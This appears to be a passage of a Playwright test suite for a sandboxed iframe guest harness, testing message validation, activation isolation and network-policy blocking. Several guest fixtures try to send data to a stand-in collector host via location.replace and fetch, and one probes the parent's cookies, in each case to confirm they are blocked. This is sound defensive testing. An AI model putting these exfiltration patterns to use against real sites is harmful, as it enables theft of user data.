            const page = await browser.newPage();
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.mount('<p>SDK guest</p>', 'none', undefined, true));
            await page.waitForFunction(() => {
                const harness = (window as unknown as HarnessWindow).hostedFrameHarness;
                return harness.events.includes('ready') || harness.rejections.length > 0;
            });
            expect(await page.evaluate(() => ({
                ready: (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('ready'),
                rejections: (window as unknown as HarnessWindow).hostedFrameHarness.rejections,
            }))).toEqual({ ready: true, rejections: [] });
        } finally { await browser.close(); }
    });

    it('keeps non-JSON port payloads and mismatched identities refused after native realm rehoming', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
            const page = await browser.newPage();
            const pageErrors: string[] = [];
            page.on('pageerror', error => pageErrors.push(error.message));
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.mount(`<script>
                const channel = new MessageChannel();
                const envelope = {version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null};
                channel.port1.onmessage = event => {
                    if (event.data.requestSequence === 99) document.body.dataset.barrier = 'ack';
                };
                parent.postMessage(envelope, '*', [channel.port2]);
                const cycle = {}; cycle.self = cycle;
                for (const payload of [new Date(), new Map([['key','value']]), NaN, Infinity, [1,,3], cycle]) {
                    channel.port1.postMessage({...envelope, sequence:1, payload});
                }
                channel.port1.postMessage({...envelope, identity:{...envelope.identity,mountNonce:'wrong'}, payload:{ready:true}});
                channel.port1.postMessage({...envelope, kind:'heightChanged', payload:{height:100}});
                const unsupportedChannel = new MessageChannel();
                channel.port1.postMessage({...envelope, payload:{port:unsupportedChannel.port1}}, [unsupportedChannel.port1]);
                channel.port1.postMessage({...envelope, sequence:99, payload:{nested:[{ready:true}]}});
            </script>`, 'none'));
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('ready'));
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            await guest.waitForFunction(() => document.body.dataset.barrier === 'ack');
            expect(await page.evaluate(() => ({
                readyCount: (window as unknown as HarnessWindow).hostedFrameHarness.events.filter(kind => kind === 'ready').length,
                rejections: (window as unknown as HarnessWindow).hostedFrameHarness.rejections,
            }))).toEqual({
                readyCount: 2,
                rejections: [...Array<string>(6).fill('invalid_message'), 'identity_mismatch', 'message_kind_denied'],
            });
            expect(pageErrors).toEqual([]);
        } finally { await browser.close(); }
    });

    it('does not lend an app control activation to a guest in an inactive shell', async () => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
            const page = await browser.newPage();
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.mount(`<body><button>Guest</button><script>
                const channel = new MessageChannel();
                const message = {version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null};
                parent.postMessage(message, '*', [channel.port2]);
                addEventListener('message', event => { if (event.data === 'activation-probe') channel.port1.postMessage({...message,sequence:1}); });
                document.querySelector('button').onclick = () => channel.port1.postMessage({...message,sequence:2});
            </script></body>`, 'none'));
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations.length === 1);
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            await guest.getByRole('button').focus();
            await page.evaluate(() => {
                const button = document.createElement('button');
                button.id = 'outside';
                button.textContent = 'App control';
                button.onclick = () => {
                    const shell = document.querySelector<HTMLIFrameElement>('[data-testid="guest-navigation-shell"]');
                    shell?.contentDocument?.querySelector<HTMLIFrameElement>('iframe')?.contentWindow?.postMessage('activation-probe', '*');
                };
                document.body.append(button);
            });
            await page.locator('#outside').click();
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations.length === 2);
            expect(await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false]);
            await guest.getByRole('button').click();
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations.length === 3);
            expect(await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.activations)).toEqual([false, false, true]);
        } finally { await browser.close(); }
    });

    it.each([
        { network: 'none' as const, origins: undefined },
        { network: 'none' as const, origins: ['https://approved.example.test'] },
        { network: 'open' as const, origins: undefined },
    ])('blocks first-load self-navigation before any unauthorized request ($network, $origins)', async ({ network, origins }) => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        try {
            const page = await browser.newPage();
            const outbound: string[] = [];
            // Intercept the real network boundary, leaving browser CSP/navigation enforcement real.
            await page.context().route('https://collector.example.test/**', async route => {
                outbound.push(route.request().url());
                await route.fulfill({ contentType: 'text/html', body: '<p>Collected</p>' });
            });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            await page.evaluate(({ network, origins }) => (window as unknown as HarnessWindow).hostedFrameHarness.mount(
                '<script>globalThis.scriptRan=true;location.replace("https://collector.example.test/steal?data=private-visual")</script>', network, origins,
            ), { network, origins });
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('load'));
            expect(outbound).toEqual([]);
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame());
            expect(guest).toBeDefined();
        } finally { await browser.close(); }
    });

    it.each(['origins', 'open'] as const)('keeps $0 subresources, document-bound bridge replies, and host push working without navigation', async policy => {
        const browser = await chromium.launch({ executablePath: resolveChromiumExecutable() });
        let phase = 'open';
        let readDiagnostics = () => '';
        try {
            const context = await browser.newContext();
            const outbound: string[] = [];
            await context.route('**/*', async route => {
                if (!route.request().url().startsWith('https://')) { await route.continue(); return; }
                outbound.push(route.request().url());
                await route.fulfill({ contentType: 'text/plain', headers: { 'Access-Control-Allow-Origin': '*' }, body: 'approved' });
            });
            const page = await context.newPage();
            readDiagnostics = collectBrowserDiagnostics({ page });
            await page.goto(origin);
            await page.addScriptTag({ url: `${origin}/bundle.js` });
            const body = `<body><button id="interactive">Live</button><script>
                globalThis.channel = new MessageChannel();
                channel.port1.onmessage = event => { document.body.dataset.reply = event.data.kind; };
                parent.postMessage({version:1,identity:{instanceId:'browser-visual',mountNonce:'browser-nonce'},sequence:0,kind:'ready',payload:null}, '*', [channel.port2]);
                fetch('https://approved.example.test/asset').then(response => response.text()).then(value => document.body.dataset.asset=value)
                    .catch(error => { document.body.dataset.assetFailure=error.name; document.body.dataset.assetFailureDetail=error.stack || error.message; });
                fetch('https://collector.example.test/forbidden').catch(() => {});
            </script></body>`;
            const options = { body, network: policy === 'open' ? 'open' as const : 'none' as const,
                origins: policy === 'origins' ? ['https://approved.example.test'] : undefined };
            await page.evaluate(options => (window as unknown as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
            phase = 'guest-ready';
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('ready'));
            const guest = page.frames().find(frame => frame.parentFrame()?.parentFrame() === page.mainFrame())!;
            phase = 'bridge-ack-and-approved-resource';
            await guest.waitForFunction(() => document.body.dataset.reply === 'ack' && (document.body.dataset.asset !== undefined || document.body.dataset.assetFailure !== undefined));
            expect(await guest.evaluate(() => ({ asset: document.body.dataset.asset, failure: document.body.dataset.assetFailure,
                ...(document.body.dataset.assetFailureDetail ? { failureDetail: document.body.dataset.assetFailureDetail } : {}),
            }))).toEqual({ asset: 'approved', failure: undefined });
            expect(await guest.evaluate(() => {
                try { return parent.document.cookie; } catch { return 'isolated'; }
            })).toBe('isolated');
            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.push({ kind: 'host-push' }));
            phase = 'host-push';
            await guest.waitForFunction(() => document.body.dataset.reply === 'host-push');
            const expectedOutbound = policy === 'open'
                ? ['https://approved.example.test/asset', 'https://collector.example.test/forbidden']
                : ['https://approved.example.test/asset'];
            expect(outbound.sort()).toEqual(expectedOutbound);

            // An equivalent immutable graph must preserve the executable document and its port.
            await page.evaluate(options => (window as unknown as HarnessWindow).hostedFrameHarness.mount(options.body, options.network, options.origins), options);
            await page.evaluate(() => (window as unknown as HarnessWindow).hostedFrameHarness.push({ kind: 'retained-push' }));
            phase = 'equivalent-document-push';
            await guest.waitForFunction(() => document.body.dataset.reply === 'retained-push');
            expect(outbound.sort()).toEqual(expectedOutbound);

            await guest.evaluate(() => location.replace('https://collector.example.test/delayed?data=private-visual'));
            phase = 'navigation-retirement';
            await page.waitForFunction(() => (window as unknown as HarnessWindow).hostedFrameHarness.events.includes('retired'));
            expect(outbound.sort()).toEqual(expectedOutbound);
        } catch (error) {
            throw appendBrowserDiagnostics(error, `Frame browser phase: ${phase}\n${readDiagnostics()}`);
        } finally { await browser.close(); }
    });
});
